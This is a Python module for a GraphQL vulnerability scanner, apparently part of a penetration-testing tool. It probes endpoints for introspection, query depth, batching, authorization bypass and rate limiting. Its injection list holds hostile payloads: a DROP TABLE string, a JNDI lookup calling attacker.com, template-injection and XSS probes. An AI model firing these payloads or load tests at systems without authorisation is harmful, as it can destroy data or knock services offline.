"""
GraphQL Vulnerability Scanner
==============================

Comprehensive GraphQL security testing module
Detects all major GraphQL-specific vulnerabilities

Author: AI Pentest Brain Team
Version: 1.0
"""

import requests
import json
import time
from typing import Dict, List, Optional, Any
import logging

logger = logging.getLogger(__name__)


class GraphQLScanner:
    """
    GraphQL-specific vulnerability scanner
    Covers all major GraphQL attack vectors
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Common GraphQL endpoints
        self.common_endpoints = [
            '/graphql',
            '/api/graphql',
            '/graphql/v1',
            '/v1/graphql',
            '/query',
            '/api/query',
            '/gql'
        ]
    
    def scan_all(self) -> List[Dict]:
        """Run all GraphQL vulnerability scans"""
        logger.info(f"Starting GraphQL vulnerability scan on {self.target_url}")
        
        vulnerabilities = []
        
        # Find GraphQL endpoint
        endpoint = self._find_graphql_endpoint()
        if not endpoint:
            logger.info("No GraphQL endpoint found")
            return vulnerabilities
        
        logger.info(f"GraphQL endpoint found: {endpoint}")
        
        # Run all checks
        vulnerabilities.extend(self._check_introspection(endpoint))
        vulnerabilities.extend(self._check_query_depth(endpoint))
        vulnerabilities.extend(self._check_batch_attacks(endpoint))
        vulnerabilities.extend(self._check_field_duplication(endpoint))
        vulnerabilities.extend(self._check_injection(endpoint))
        vulnerabilities.extend(self._check_authorization_bypass(endpoint))
        vulnerabilities.extend(self._check_rate_limiting(endpoint))
        vulnerabilities.extend(self._check_dos_attacks(endpoint))
        
        return vulnerabilities
    
    def _find_graphql_endpoint(self) -> Optional[str]:
        """Find GraphQL endpoint"""
        for path in self.common_endpoints:
            url = self.target_url.rstrip('/') + path
            
            # Try simple query
            query = {"query": "{__typename}"}
            try:
                response = self.session.post(url, json=query, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data or 'errors' in data:
                        return url
            except:
                continue
        
        return None
    
    def _check_introspection(self, endpoint: str) -> List[Dict]:
        """Check if introspection is enabled (should be disabled in production)"""
        vulnerabilities = []
        
        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                        }
                    }
                }
            }
            """
        }
        
        try:
            response = self.session.post(endpoint, json=introspection_query, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if 'data' in data and '__schema' in data['data']:
                    schema_types = data['data']['__schema']['types']
                    
                    vulnerabilities.append({
                        'type': 'graphql_introspection_enabled',
                        'severity': 'MEDIUM',
                        'endpoint': endpoint,
                        'description': 'GraphQL introspection is enabled, exposing full schema',
                        'impact': 'Attackers can discover all queries, mutations, and types',
                        'evidence': f'Found {len(schema_types)} types in schema',
                        'recommendation': 'Disable introspection in production environments',
                        'cwe': 'CWE-200: Information Exposure'
                    })
        
        except Exception as e:
            logger.debug(f"Introspection check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_query_depth(self, endpoint: str) -> List[Dict]:
        """Check for query depth attack vulnerability"""
        vulnerabilities = []
        
        # Create deeply nested query
        deep_query = self._generate_deep_query(50)
        
        try:
            start_time = time.time()
            response = self.session.post(endpoint, json={"query": deep_query}, timeout=30)
            duration = time.time() - start_time
            
            # If query completes (no depth limit)
            if response.status_code == 200 and duration > 2:
                vulnerabilities.append({
                    'type': 'graphql_query_depth_attack',
                    'severity': 'HIGH',
                    'endpoint': endpoint,
                    'description': 'No query depth limit - vulnerable to DoS attacks',
                    'impact': 'Attacker can cause resource exhaustion with deeply nested queries',
                    'evidence': f'50-level deep query executed in {duration:.2f}s',
                    'recommendation': 'Implement query depth limiting (max 5-10 levels)',
                    'cwe': 'CWE-770: Allocation of Resources Without Limits'
                })
        
        except requests.exceptions.Timeout:
            # Timeout might indicate protection is working
            pass
        except Exception as e:
            logger.debug(f"Query depth check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_batch_attacks(self, endpoint: str) -> List[Dict]:
        """Check for batch query attack vulnerability"""
        vulnerabilities = []
        
        # Try batch query (array of queries)
        batch_query = [
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"}
        ]
        
        try:
            response = self.session.post(endpoint, json=batch_query, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                # If batching is allowed
                if isinstance(data, list) and len(data) == 5:
                    vulnerabilities.append({
                        'type': 'graphql_batch_attack',
                        'severity': 'MEDIUM',
                        'endpoint': endpoint,
                        'description': 'GraphQL batching enabled without rate limiting',
                        'impact': 'Attacker can bypass rate limits and cause resource exhaustion',
                        'evidence': 'Successfully executed 5 queries in single request',
                        'recommendation': 'Disable batching or implement strict limits (max 2-5 queries)',
                        'cwe': 'CWE-770: Allocation of Resources Without Limits'
                    })
        
        except Exception as e:
            logger.debug(f"Batch attack check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_field_duplication(self, endpoint: str) -> List[Dict]:
        """Check for field duplication attack"""
        vulnerabilities = []
        
        # Create query with duplicated fields
        dup_query = {
            "query": """
            {
                a: __typename
                b: __typename
                c: __typename
                d: __typename
                e: __typename
                f: __typename
                g: __typename
                h: __typename
                i: __typename
                j: __typename
            }
            """
        }
        
        try:
            start_time = time.time()
            response = self.session.post(endpoint, json=dup_query, timeout=10)
            duration = time.time() - start_time
            
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'graphql_field_duplication',
                    'severity': 'MEDIUM',
                    'endpoint': endpoint,
                    'description': 'No field duplication limit - vulnerable to amplification attacks',
                    'impact': 'Attacker can amplify queries to cause resource exhaustion',
                    'evidence': f'10 duplicate fields executed in {duration:.2f}s',
                    'recommendation': 'Limit field aliases and duplications per query',
                    'cwe': 'CWE-770: Allocation of Resources Without Limits'
                })
        
        except Exception as e:
            logger.debug(f"Field duplication check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_injection(self, endpoint: str) -> List[Dict]:
        """Check for GraphQL injection vulnerabilities"""
        vulnerabilities = []
        
        injection_payloads = [
            "'; DROP TABLE users--",
            "' OR '1'='1",
            "${jndi:ldap://attacker.com/a}",
            "{{7*7}}",
            "<script>alert('XSS')</script>"
        ]
        
        for payload in injection_payloads:
            query = {
                "query": f'{{ __typename(arg: "{payload}") }}'
            }
            
            try:
                response = self.session.post(endpoint, json=query, timeout=5)
                
                # Check if payload is reflected in error
                if response.status_code in [200, 400, 500]:
                    response_text = response.text
                    
                    if payload in response_text and 'error' not in response_text.lower():
                        vulnerabilities.append({
                            'type': 'graphql_injection',
                            'severity': 'HIGH',
                            'endpoint': endpoint,
                            'description': 'GraphQL injection vulnerability detected',
                            'impact': 'Possible injection leading to data leakage or command execution',
                            'evidence': f'Payload reflected: {payload}',
                            'recommendation': 'Implement strict input validation and parameterization',
                            'cwe': 'CWE-89: SQL Injection / CWE-74: Injection'
                        })
                        break  # Found one, no need to test more
            
            except Exception as e:
                logger.debug(f"Injection check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_authorization_bypass(self, endpoint: str) -> List[Dict]:
        """Check for authorization bypass vulnerabilities"""
        vulnerabilities = []
        
        # Try accessing types that should require auth
        protected_queries = [
            '{ users { id email password } }',
            '{ admin { data } }',
            '{ privateData { secret } }',
            '{ __type(name: "User") { fields { name } } }'
        ]
        
        for query_str in protected_queries:
            query = {"query": query_str}
            
            try:
                response = self.session.post(endpoint, json=query, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # If we got data without auth
                    if 'data' in data and data['data']:
                        vulnerabilities.append({
                            'type': 'graphql_authorization_bypass',
                            'severity': 'CRITICAL',
                            'endpoint': endpoint,
                            'description': 'GraphQL authorization bypass - accessing protected data',
                            'impact': 'Unauthorized access to sensitive data',
                            'evidence': f'Accessed protected query: {query_str}',
                            'recommendation': 'Implement field-level authorization checks',
                            'cwe': 'CWE-862: Missing Authorization'
                        })
                        break
            
            except Exception as e:
                logger.debug(f"Authorization check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_rate_limiting(self, endpoint: str) -> List[Dict]:
        """Check if rate limiting is implemented"""
        vulnerabilities = []
        
        # Send multiple requests quickly
        request_count = 20
        successful_requests = 0
        
        try:
            for i in range(request_count):
                response = self.session.post(
                    endpoint, 
                    json={"query": "{__typename}"}, 
                    timeout=2
                )
                if response.status_code == 200:
                    successful_requests += 1
            
            # If most requests succeeded, rate limiting might be weak/missing
            if successful_requests >= request_count * 0.8:
                vulnerabilities.append({
                    'type': 'graphql_no_rate_limiting',
                    'severity': 'MEDIUM',
                    'endpoint': endpoint,
                    'description': 'No rate limiting detected on GraphQL endpoint',
                    'impact': 'Vulnerable to brute force and DoS attacks',
                    'evidence': f'{successful_requests}/{request_count} requests succeeded',
                    'recommendation': 'Implement rate limiting (e.g., 100 requests per minute)',
                    'cwe': 'CWE-770: Allocation of Resources Without Limits'
                })
        
        except Exception as e:
            logger.debug(f"Rate limiting check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_dos_attacks(self, endpoint: str) -> List[Dict]:
        """Check for DoS attack vectors"""
        vulnerabilities = []
        
        # Try circular query (if introspection is enabled)
        circular_query = {
            "query": """
            {
                user {
                    friends {
                        friends {
                            friends {
                                friends {
                                    name
                                }
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            start_time = time.time()
            response = self.session.post(endpoint, json=circular_query, timeout=10)
            duration = time.time() - start_time
            
            if response.status_code == 200 and duration > 3:
                vulnerabilities.append({
                    'type': 'graphql_dos_vulnerability',
                    'severity': 'HIGH',
                    'endpoint': endpoint,
                    'description': 'GraphQL endpoint vulnerable to DoS via circular queries',
                    'impact': 'Attacker can cause resource exhaustion',
                    'evidence': f'Circular query executed in {duration:.2f}s',
                    'recommendation': 'Implement query complexity analysis and timeouts',
                    'cwe': 'CWE-400: Uncontrolled Resource Consumption'
                })
        
        except requests.exceptions.Timeout:
            # Timeout is actually good here
            pass
        except Exception as e:
            logger.debug(f"DoS check error: {str(e)}")
        
        return vulnerabilities
    
    def _generate_deep_query(self, depth: int) -> str:
        """Generate deeply nested query for depth testing"""
        query = "{"
        for i in range(depth):
            query += "user { "
        query += "name"
        query += " }" * depth
        query += "}"
        return query


# Test function
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    print("="*70)
    print("GraphQL Vulnerability Scanner - Test")
    print("="*70 + "\n")
    
    # Example usage
    target = "http://localhost:4000"  # Replace with actual GraphQL endpoint
    scanner = GraphQLScanner(target)
    
    vulnerabilities = scanner.scan_all()
    
    print(f"\n[+] Found {len(vulnerabilities)} GraphQL vulnerabilities\n")
    
    for vuln in vulnerabilities:
        print(f"Type: {vuln['type']}")
        print(f"Severity: {vuln['severity']}")
        print(f"Description: {vuln['description']}")
        print(f"Recommendation: {vuln['recommendation']}")
        print("-" * 70)
